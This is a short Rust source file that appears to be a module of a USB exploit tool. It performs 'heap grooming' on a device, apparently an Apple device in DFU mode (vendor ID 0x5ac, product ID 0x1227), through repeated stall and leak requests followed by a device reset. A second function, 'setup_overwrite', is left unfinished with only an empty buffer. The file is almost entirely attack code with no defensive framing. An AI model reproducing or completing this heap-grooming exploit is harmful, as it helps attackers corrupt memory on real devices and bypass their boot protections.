use std::{time::Duration, thread::sleep};
use libusb1_sys::{libusb_reset_device, libusb_open_device_with_vid_pid};
use rusb::{DeviceHandle, Context};
use crate::usbexec::{reconnect_device, usb_stall, usb_no_leak, usb_req_leak};

pub fn heap_grooming(context: &Context, dev: &mut DeviceHandle<Context>, vid: u16, pid: u16) {
    reconnect_device(context, dev, vid, pid, Duration::from_secs(1));

    usb_stall();

    for _ in 0..5 {
        usb_no_leak()
    }
    usb_req_leak();
    usb_no_leak();
    unsafe {
        let han = libusb_open_device_with_vid_pid(std::ptr::null_mut(), 0x5ac , 0x1227);
        libusb_reset_device(han);
    }
    sleep(Duration::from_micros(500000));
}

pub fn setup_overwrite(context: &Context, dev: DeviceHandle<Context>, vid: u16, pid: u16) {
    let buf: [u8; 0x800] = [0; 0x800];


}